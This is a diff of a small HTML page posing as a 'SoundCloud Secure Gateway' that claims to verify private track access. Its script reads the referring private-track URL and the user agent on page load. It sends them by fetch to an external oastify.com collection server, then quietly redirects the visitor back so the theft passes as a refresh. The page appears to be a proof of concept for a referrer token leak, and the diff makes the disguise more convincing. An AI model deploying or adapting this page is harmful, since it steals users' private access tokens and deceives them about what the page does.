@@ -1,29 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="referrer" content="unsafe-url"> <title>Checking Permissions...</title>
+    <meta name="referrer" content="unsafe-url">
+    <title>Connecting...</title>
 </head>
 <body>
     <script>
-        // CAPTURE: We grab the full URL of the private track directly
-        const secretData = {
-            alert: "PRIVATE_TOKEN_LEAKED",
-            secret_url: document.referrer, 
-            victim_ua: navigator.userAgent
+        // 1. Capture the Referrer via JS immediately on load
+        // This works because 'document.referrer' is available to JS 
+        // even if the HTTP header is stripped by the browser!
+        const capturedReferrer = document.referrer; 
+
+        const leak = {
+            status: "SUCCESS_PRIVATE_TOKEN_CAPTURED",
+            secret_url: capturedReferrer, 
+            ua: navigator.userAgent
         };
 
-        // EXFILTRATE: Send it to your Oastify server
+        // 2. Send the captured JS variable to Oastify
         fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/exfiltrate', {
             method: 'POST',
             mode: 'no-cors',
-            body: JSON.stringify(secretData)
+            body: JSON.stringify(leak)
         });
 
-        // STEALTH: Send them back to the track so they think it was a refresh
+        // 3. Auto-redirect back to the track
         setTimeout(() => {
-            window.location.href = document.referrer || "https://soundcloud.com";
-        }, 800);
+            window.location.href = capturedReferrer || "https://soundcloud.com";
+        }, 1000);
     </script>
-    <p>Verifying track access...</p>
+    <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
+        <h2>SoundCloud Secure Gateway</h2>
+        <p>Verifying your private access token...</p>
+    </div>
 </body>
 </html>
